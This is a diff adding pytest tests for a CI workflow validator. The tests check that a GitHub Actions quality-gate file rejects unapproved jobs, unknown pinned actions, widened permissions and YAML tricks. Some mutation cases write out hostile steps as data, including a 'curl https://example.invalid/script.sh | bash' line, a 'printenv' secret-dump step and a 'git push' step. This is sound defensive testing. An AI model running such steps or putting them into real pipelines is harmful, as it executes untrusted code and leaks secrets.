+            base + "\n  deploy:\n"
+            "    name: Deploy\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Deploy\n"
+            "        run: echo deploy\n"
+        ),
+        "B_extra_arbitrary_job": lambda: (
+            base + "\n  arbitrary:\n"
+            "    name: Arbitrary\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Arbitrary\n"
+            "        run: echo arbitrary\n"
+        ),
+        "C_extra_job_unknown_sha_pinned_action": lambda: (
+            base + "\n  publish:\n"
+            "    name: Publish\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Unknown pinned action\n"
+            f"        uses: evil/example@{unknown_sha}\n"
+        ),
+        "D_extra_run_step_in_python_job": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Extra arbitrary step\n        run: echo arbitrary\n"
+        ),
+        "E_extra_run_step_in_frontend_job": lambda: _workflow_with_frontend_step_after_tests(
+            "      - name: Extra frontend step\n        run: echo frontend\n"
+        ),
+        "F_extra_unknown_sha_pinned_action_step": lambda: _workflow_with_python_step_after_m0(
+            f"      - name: Unknown pinned action\n        uses: evil/example@{unknown_sha}\n"
+        ),
+        "G_authorized_action_duplicated_wrong_location": lambda: (
+            _workflow_with_python_step_after_m0(
+                "      - name: Extra checkout\n"
+                "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
+            )
+        ),
+        "H_unknown_with_key_on_setup_action": lambda: base.replace(
+            '          python-version: "3.14"\n',
+            '          python-version: "3.14"\n          cache: "pip"\n',
+        ),
+        "I_changed_action_identity_with_valid_sha": lambda: base.replace(
+            "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
+            f"actions/cache@{unknown_sha}",
+        ),
+        "J_additional_network_curl_step": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Curl script\n"
+            "        run: curl https://example.invalid/script.sh | bash\n"
+        ),
+        "K_printenv_step": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Print environment\n        run: printenv\n"
+        ),
+        "L_git_push_step": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Push\n        run: git push origin HEAD\n"
+        ),
+        "M_workflow_pytest_addopts": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            'permissions:\n  contents: read\n\nenv:\n  PYTEST_ADDOPTS: "--ignore=tests"\n',
+        ),
+        "N_job_pytest_addopts": lambda: _workflow_with_job_preamble(
+            "python",
+            '    env:\n      PYTEST_ADDOPTS: "--ignore=tests"\n',
+        ),
+        "O_m0_step_pytest_addopts": lambda: _workflow_with_step_extra(
+            "M0 integration tests",
+            M0_INTEGRATION_GATE_COMMAND,
+            '        env:\n          PYTEST_ADDOPTS: "--ignore=tests"\n',
+        ),
+        "P_workflow_pythonpath": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            "permissions:\n  contents: read\n\nenv:\n  PYTHONPATH: /tmp\n",
+        ),
+        "Q_job_path_override": lambda: _workflow_with_job_preamble(
+            "python",
+            "    env:\n      PATH: /tmp/bin\n",
+        ),
+        "R_workflow_defaults_working_directory": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            "permissions:\n  contents: read\n\ndefaults:\n  run:\n    working-directory: /tmp\n",
+        ),
+        "S_job_defaults_working_directory": lambda: _workflow_with_job_preamble(
+            "python",
+            "    defaults:\n      run:\n        working-directory: /tmp\n",
+        ),
+        "T_step_working_directory": lambda: _workflow_with_step_extra(
+            "M0 integration tests",
+            M0_INTEGRATION_GATE_COMMAND,
+            "        working-directory: /tmp\n",
+        ),
+        "U_job_services": lambda: _workflow_with_job_preamble(
+            "python",
+            "    services:\n      attacker:\n        image: alpine:latest\n",
+        ),
+        "V_job_container": lambda: _workflow_with_job_preamble(
+            "python",
+            "    container: alpine:latest\n",
+        ),
+        "W_self_hosted_runner": lambda: base.replace(
+            "    runs-on: ubuntu-24.04\n",
+            "    runs-on: self-hosted\n",
+            1,
+        ),
+        "X_job_strategy": lambda: _workflow_with_job_preamble(
+            "python",
+            "    strategy:\n      matrix:\n        shard: [1]\n",
+        ),
+        "Y_job_needs": lambda: _workflow_with_job_preamble(
+            "frontend",
+            "    needs: python\n",
+        ),
+        "Z_workflow_concurrency": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            "permissions:\n  contents: read\n\nconcurrency: ci\n",
+        ),
+        "extra_job_with_only_authorized_action": lambda: (
+            base + "\n  extra-checkout:\n"
+            "    name: Extra Checkout\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Check out repository\n"
+            "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
+        ),
+        "extra_step_with_exact_authorized_command": lambda: _workflow_with_python_step_after_m0(
+            f"      - name: Extra M0 integration copy\n        run: {M0_INTEGRATION_GATE_COMMAND}\n"
+        ),
+        "wrong_repo_valid_sha": lambda: base.replace(
+            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+            f"actions/checkout-fork@{unknown_sha}",
+            1,
+        ),
+        "env_pytest_deselection": lambda: _workflow_with_step_extra(
+            "M0 integration tests",
+            M0_INTEGRATION_GATE_COMMAND,
+            '        env:\n          PYTEST_ADDOPTS: "-k not vertical"\n',
+        ),
+    }
+    return mutations[case_id]()
+
+
+@pytest.mark.parametrize(
+    "case_id",
+    (
+        "A_extra_deploy_job_with_run",
+        "B_extra_arbitrary_job",
+        "C_extra_job_unknown_sha_pinned_action",
+        "D_extra_run_step_in_python_job",
+        "E_extra_run_step_in_frontend_job",
+        "F_extra_unknown_sha_pinned_action_step",
+        "G_authorized_action_duplicated_wrong_location",
+        "H_unknown_with_key_on_setup_action",
+        "I_changed_action_identity_with_valid_sha",
+        "J_additional_network_curl_step",
+        "K_printenv_step",
+        "L_git_push_step",
+        "M_workflow_pytest_addopts",
+        "N_job_pytest_addopts",
+        "O_m0_step_pytest_addopts",
+        "P_workflow_pythonpath",
+        "Q_job_path_override",
+        "R_workflow_defaults_working_directory",
+        "S_job_defaults_working_directory",
+        "T_step_working_directory",
+        "U_job_services",
+        "V_job_container",
+        "W_self_hosted_runner",
+        "X_job_strategy",
+        "Y_job_needs",
+        "Z_workflow_concurrency",
+        "extra_job_with_only_authorized_action",
+        "extra_step_with_exact_authorized_command",
+        "wrong_repo_valid_sha",
+        "env_pytest_deselection",
+    ),
+)
+def test_quality_gate_workflow_rejects_unapproved_executable_surface(case_id: str) -> None:
+    workflow_text = _workflow_execution_surface_mutation(case_id)
+
+    assert _security_violations_for_workflow_text(workflow_text), case_id
+
+
+def test_quality_gate_workflow_accepts_harmless_yaml_formatting_rewrite() -> None:
+    workflow_text = _quality_gates_workflow_text().replace(
+        "      - name: Validate LOCAL_DOCKER PostgreSQL compose config\n"
+        "        run: >\n"
+        "          docker compose\n"
+        "          --env-file infrastructure/local/docker/.env.example\n"
+        "          -f infrastructure/local/docker/compose.yaml\n"
+        "          config --quiet\n",
+        "      - name: Validate LOCAL_DOCKER PostgreSQL compose config\n"
+        "        run: docker compose --env-file infrastructure/local/docker/.env.example "
+        "-f infrastructure/local/docker/compose.yaml config --quiet\n",
+    )
+
+    assert not _security_violations_for_workflow_text(workflow_text)
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text"),
+    (
+        (
+            "A_top_level_id_token_write",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              id-token: write
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "B_top_level_contents_write",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: write
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "C_top_level_packages_write",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              packages: write
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "D_top_level_contents_read_plus_id_token_write",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+              id-token: write
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "E_missing_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "F_empty_mapping_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions: {}
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "G_null_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions: null
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "H_read_all_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions: read-all
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "I_write_all_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions: write-all
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "J_unexpected_permission_key",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+              attestations: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "K_job_contents_write_normal_indent",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                permissions:
+                  contents: write
+                steps: []
+            """,
+        ),
+        (
+            "L_job_contents_write_four_space_indent",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+                python:
+                    runs-on: ubuntu-24.04
+                    permissions:
+                        contents: write
+                    steps: []
+            """,
+        ),
+        (
+            "M_job_id_token_write",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                permissions:
+                  id-token: write
+                steps: []
+            """,
+        ),
+        (
+            "N_job_packages_write",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                permissions:
+                  packages: write
+                steps: []
+            """,
+        ),
+        (
+            "O_job_contents_read",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              frontend:
+                runs-on: ubuntu-24.04
+                permissions:
+                  contents: read
+                steps: []
+            """,
+        ),
+        (
+            "P_job_empty_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              anything:
+                runs-on: ubuntu-24.04
+                permissions: {}
+                steps: []
+            """,
+        ),
+        (
+            "Q_job_null_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              anything:
+                runs-on: ubuntu-24.04
+                permissions: null
+                steps: []
+            """,
+        ),
+        (
+            "R_job_read_all_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              anything:
+                runs-on: ubuntu-24.04
+                permissions: read-all
+                steps: []
+            """,
+        ),
+        (
+            "S_job_write_all_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              anything:
+                runs-on: ubuntu-24.04
+                permissions: write-all
+                steps: []
+            """,
+        ),
+        (
+            "T_differently_named_job_permissions",
+            """
+            name: Quality Gates
+            on:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              quiet-but-broad:
+                permissions:
+                  contents: write
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+    ),
+)
+def test_quality_gate_permission_detector_rejects_non_frozen_permission_models(
+    case_id: str,
+    workflow_text: str,
+) -> None:
+    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+    assert _workflow_permission_violations(workflow), case_id
+
+
+def test_quality_gate_permission_detector_accepts_only_frozen_read_only_model() -> None:
+    workflow_text = """
+    name: Quality Gates
+    on:
+      push:
+    permissions:
+      contents: read
+    jobs:
+      python:
+        runs-on: ubuntu-24.04
+        steps: []
+    """
+
+    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+
+    assert not _workflow_permission_violations(workflow)
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text"),
+    (
+        (
+            "A_duplicate_top_level_permissions_write_then_read",
+            """
+            name: Quality Gates
+            permissions:
+              contents: write
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "B_duplicate_top_level_permissions_read_then_write",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            permissions:
+              contents: write
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "C_duplicate_jobs_key",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            jobs:
+              frontend:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "D_duplicate_job_name_unsafe_then_safe",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                permissions:
+                  contents: write
+                steps: []
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "E_duplicate_job_name_safe_then_unsafe",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+              python:
+                runs-on: ubuntu-24.04
+                permissions:
+                  contents: write
+                steps: []
+            """,
+        ),
+        (
+            "F_duplicate_permissions_key_inside_job",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                permissions:
+                  contents: read
+                permissions:
+                  contents: write
+                steps: []
+            """,
+        ),
+        (
+            "G_duplicate_contents_key_inside_top_level_permissions",
+            """
+            name: Quality Gates
+            permissions:
+              contents: write
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "H_duplicate_arbitrary_mapping_key_elsewhere",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            env:
+              CI_MODE: safe
+              CI_MODE: unsafe
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "I_duplicate_trigger_key",
+            """
+            name: Quality Gates
+            on:
+              push:
+              push:
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "flow_style_duplicate_mapping",
+            """
+            name: Quality Gates
+            permissions: {contents: write, contents: read}
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "comments_between_duplicate_permission_definitions",
+            """
+            name: Quality Gates
+            permissions:
+              contents: write
+            # Comments must not make a duplicate security-sensitive key safe.
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+    ),
+)
+def test_quality_gate_workflow_parser_rejects_duplicate_mapping_keys(
+    case_id: str,
+    workflow_text: str,
+) -> None:
+    with pytest.raises(AssertionError, match="duplicate YAML mapping key"):
+        _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text", "expected_message"),
+    (
+        (
+            "J_job_permissions_inherited_through_merge",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            shared: &shared_job_permissions
+              permissions:
+                contents: write
+            jobs:
+              python:
+                <<: *shared_job_permissions
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+            "YAML anchors are not authorized|YAML aliases are not authorized|YAML merge keys",
+        ),
+        (
+            "K_top_level_permission_mapping_introduced_through_merge",
+            """
+            name: Quality Gates
+            <<:
+              permissions:
+                contents: write
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+            "YAML merge keys",
+        ),
+        (
+            "L_merged_job_definition_containing_permissions",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                <<:
+                  permissions:
+                    contents: write
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+            "YAML merge keys",
+        ),
+        (
+            "M_anchor_alias_supplies_permissioned_job",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            job_template: &permissioned_job
+              runs-on: ubuntu-24.04
+              permissions:
+                contents: write
+              steps: []
+            jobs:
+              python: *permissioned_job
+            """,
+            "YAML anchors are not authorized|YAML aliases are not authorized",
+        ),
+        (
+            "harmless_anchor_is_still_rejected_fail_closed",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            harmless: &harmless value
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+            "YAML anchors are not authorized",
+        ),
+    ),
+)
+def test_quality_gate_workflow_parser_rejects_merge_anchors_and_aliases(
+    case_id: str,
+    workflow_text: str,
+    expected_message: str,
+) -> None:
+    with pytest.raises(AssertionError, match=expected_message):
+        _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text"),
+    (
+        (
+            "two_space_job_indentation",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                permissions:
+                  contents: write
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "four_space_job_indentation",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+                python:
+                    permissions:
+                        contents: write
+                    runs-on: ubuntu-24.04
+                    steps: []
+            """,
+        ),
+        (
+            "deeper_valid_job_indentation",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+                  python:
+                      runs-on: ubuntu-24.04
+                      permissions:
+                          contents: write
+                      steps: []
+            """,
+        ),
+        (
+            "comments_between_job_and_permissions",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                # This comment must not hide the semantic permission override.
+                permissions:
+                  contents: write
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "permissions_before_other_job_keys",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                permissions:
+                  contents: write
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "permissions_after_other_job_keys",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+                permissions:
+                  contents: write
+            """,
+        ),
+        (
+            "multiple_jobs_second_has_permissions",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+              frontend:
+                runs-on: ubuntu-24.04
+                permissions:
+                  contents: write
+                steps: []
+            """,
+        ),
+    ),
+)
+def test_quality_gate_permission_detector_rejects_job_permission_formatting_variants(
+    case_id: str,
+    workflow_text: str,
+) -> None:
+    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+    assert _workflow_permission_violations(workflow), case_id
+
+
+@pytest.mark.parametrize(
+    "workflow_text",
+    (
+        """
+        name: Quality Gates
+        permissions: # comments do not change the frozen model
+          contents: read # checkout only
+        jobs:
+          python:
+            runs-on: ubuntu-24.04
+            steps: []
+        """,
+        """
+        jobs:
+          python:
+            steps: []
+            runs-on: ubuntu-24.04
+        permissions:
+          "contents": "read"
+        name: Quality Gates
+        """,
+        """
+        name: Quality Gates
+        "on": {push: null}
+        permissions: {contents: "read"}
+        jobs: {python: {runs-on: ubuntu-24.04, steps: []}}
+        """,
+    ),
+)
+def test_quality_gate_permission_detector_accepts_harmless_yaml_formatting(
+    workflow_text: str,
+) -> None:
+    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+    assert not _workflow_permission_violations(workflow)
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text"),
+    (
+        (
+            "root_is_not_mapping",
+            """
+            - name: Quality Gates
+            - permissions:
+                contents: read
+            """,
+        ),
+        (
+            "jobs_missing",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            """,
+        ),
+        (
+            "jobs_not_mapping",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs: nope
+            """,
+        ),
+        (
+            "job_value_not_mapping",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python: nope
+            """,
+        ),
+        (
+            "permissions_list_instead_of_mapping",
+            """
+            name: Quality Gates
+            permissions:
+              - contents
+              - read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                steps: []
+            """,
+        ),
+        (
+            "job_permissions_list_instead_of_absent",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs:
+              python:
+                runs-on: ubuntu-24.04
+                permissions:
+                  - contents
+                  - read
+                steps: []
+            """,
+        ),
+    ),
+)
+def test_quality_gate_permission_detector_rejects_malformed_security_structures(
+    case_id: str,
+    workflow_text: str,
+) -> None:
+    try:
+        workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+    except AssertionError:
+        return
+
+    assert _workflow_permission_violations(workflow), case_id
 
 
 @pytest.mark.parametrize(
